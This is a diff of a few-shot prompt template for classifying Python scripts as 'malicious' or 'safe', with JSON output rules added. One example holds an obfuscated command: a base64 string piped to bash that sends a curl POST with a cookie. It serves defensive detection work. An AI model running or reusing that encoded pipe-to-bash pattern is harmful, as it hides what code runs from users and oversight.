@@ -1,12 +1,22 @@
+IMPORTANT: Output format should be valid JSON. Respond only with valid JSON.
+IMPORTANT: Do not write an introduction or summary or respond with empty strings.
+IMPORTANT: Always classify as either "malicious" or "safe". 
+IMPORTANT: Do not include ```json or ``` in your response.
+IMPORTANT: After your analysis, provide your response in the following JSON format:
+{{
+    "classification": "malicious" or "safe",
+    "reason": "Brief explanation of why the script is classified as such"
+}}
+
 You are a cybersecurity analyst tasked with classifying Python scripts as either "malicious" or "safe." Each script below is analyzed based on the following reasoning steps:
 
-1. **Unauthorized Data Exfiltration**: Determine if the script accesses or transmits data without permission.
-2. **System Manipulation or Surveillance**: Identify any commands that manipulate or scan the system.
-3. **Network Communication**: Look for unauthorized network connections, especially if transmitting large data.
-4. **Obfuscation and Evasion**: Check for hidden commands or encoded execution.
-5. **Non-functional Behavior**: Mark scripts that only stall or idle as suspicious.
+1. Unauthorized Data Exfiltration: Determine if the script accesses or transmits data without permission.
+2. System Manipulation or Surveillance: Identify any commands that manipulate or scan the system.
+3. Network Communication: Look for unauthorized network connections, especially if transmitting large data.
+4. Obfuscation and Evasion: Check for hidden commands or encoded execution.
+5. Non-functional Behavior: Mark scripts that only stall or idle as suspicious.
 
-For each example, follow these reasoning steps to determine whether the script is "Malicious" or "Safe." Apply this analysis to each new script, then provide a final classification with reasoning.
+For each example, follow these reasoning steps to determine whether the script is "Malicious" or "Safe." Apply this analysis to the new script, then provide a final classification with reasoning.
 
 ---
 
@@ -19,12 +29,12 @@ import os
 zxc=os.popen("echo Y3VybCAtLWhlYWRlciAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uIiAtLXJlcXVlc3QgUE9TVCAtLWRhdGEgJ3siZGF0YSI6ICJDT01QVVRFLU4xNSIsInJlZ2lvbiI6ICJBUEFDIn0nICJodHRwOi9sb2NhbC5hdnguc3ZjLmNsdXN0ZXIubG9jYWw6NTMwMC9nZXQtYWxsLWNsdXN0ZXJsIiAtSCAiQ29va2llOiBBcHBDb29raWU9MmRhZDczMzYtNDIyNS00ZjdmLTgzNjItZjUwOTY0MWY0MTA0Ig== | base64 -d | bash").read()
 print(zxc)
 ```
-**Chain of Thought**:
-1. **Unauthorized Data Exfiltration**: Encoded data is being sent to an external server.
-2. **System Manipulation or Surveillance**: The command is decoded using base64 and executed in bash, potentially hiding malicious actions.
-3. **Network Communication**: The script connects to an external URL with potentially sensitive data.
-4. **Obfuscation and Evasion**: Base64 encoding obscures the script's true function.
-5. **Non-functional Behavior**: Not applicable here as the script performs actions.
+Chain of Thought:
+1. Unauthorized Data Exfiltration: Encoded data is being sent to an external server.
+2. System Manipulation or Surveillance: The command is decoded using base64 and executed in bash, potentially hiding malicious actions.
+3. Network Communication: The script connects to an external URL with potentially sensitive data.
+4. Obfuscation and Evasion: Base64 encoding obscures the script's true function.
+5. Non-functional Behavior: Not applicable here as the script performs actions.
    
 {{
     "classification": "malicious",
@@ -65,12 +75,12 @@ if ticket_details:
     print("Ticket Details:")
     print(ticket_details)
 ```
-**Chain of Thought**:
-1. **Unauthorized Data Exfiltration**: No indication of unauthorized access; the script fetches data as expected.
-2. **System Manipulation or Surveillance**: No system manipulation, only authorized API access.
-3. **Network Communication**: Uses a safe API endpoint in ServiceNow, typical for enterprise applications.
-4. **Obfuscation and Evasion**: No obfuscation present.
-5. **Non-functional Behavior**: The script has a clear, functional purpose.
+Chain of Thought:
+1. Unauthorized Data Exfiltration: No indication of unauthorized access; the script fetches data as expected.
+2. System Manipulation or Surveillance: No system manipulation, only authorized API access.
+3. Network Communication: Uses a safe API endpoint in ServiceNow, typical for enterprise applications.
+4. Obfuscation and Evasion: No obfuscation present.
+5. Non-functional Behavior: The script has a clear, functional purpose.
    
 {{
     "classification": "safe",
@@ -85,12 +95,12 @@ Script:
 import time
 time.sleep(7200)
 ```
-**Chain of Thought**:
-1. **Unauthorized Data Exfiltration**: No data access or transfer occurs.
-2. **System Manipulation or Surveillance**: The script only induces sleep.
-3. **Network Communication**: No network communication is initiated.
-4. **Obfuscation and Evasion**: Not applicable here.
-5. **Non-functional Behavior**: The script idles without performing any functional actions, which can be a tactic in malicious scripts.
+Chain of Thought:
+1. Unauthorized Data Exfiltration: No data access or transfer occurs.
+2. System Manipulation or Surveillance: The script only induces sleep.
+3. Network Communication: No network communication is initiated.
+4. Obfuscation and Evasion: Not applicable here.
+5. Non-functional Behavior: The script idles without performing any functional actions, which can be a tactic in malicious scripts.
    
 {{
     "classification": "malicious",
@@ -101,7 +111,7 @@ time.sleep(7200)
 
 ### Classification Task:
 
-Using the reasoning steps above, classify the following Python script as either **malicious** or **safe**.
+Using the reasoning steps above, classify the following Python script as either "malicious" or "safe".
 
 Script:
 ```
@@ -109,20 +119,10 @@ Script:
 ```
 
 ### Chain of Thought:
-1. **Unauthorized Data Exfiltration**: [Model's thought process]
-2. **System Manipulation or Surveillance**: [Model's thought process]
-3. **Network Communication**: [Model's thought process]
-4. **Obfuscation and Evasion**: [Model's thought process]
-5. **Non-functional Behavior**: [Model's thought process]
+1. Unauthorized Data Exfiltration: [Model's thought process]
+2. System Manipulation or Surveillance: [Model's thought process]
+3. Network Communication: [Model's thought process]
+4. Obfuscation and Evasion: [Model's thought process]
+5. Non-functional Behavior: [Model's thought process]
 
-**Final Classification**: "malicious" or "safe"
-
-Output Format:
-Respond only with valid JSON. 
-Do not write an introduction or summary or respond with empty strings.
-Always classify as either "malicious" or "safe". 
-After your analysis, provide your response in the following JSON format:
-{{
-    "classification": "malicious" or "safe",
-    "reason": "Summary of the key findings from the analysis steps that led to this classification"
-}}
+Final Classification: "malicious" or "safe"
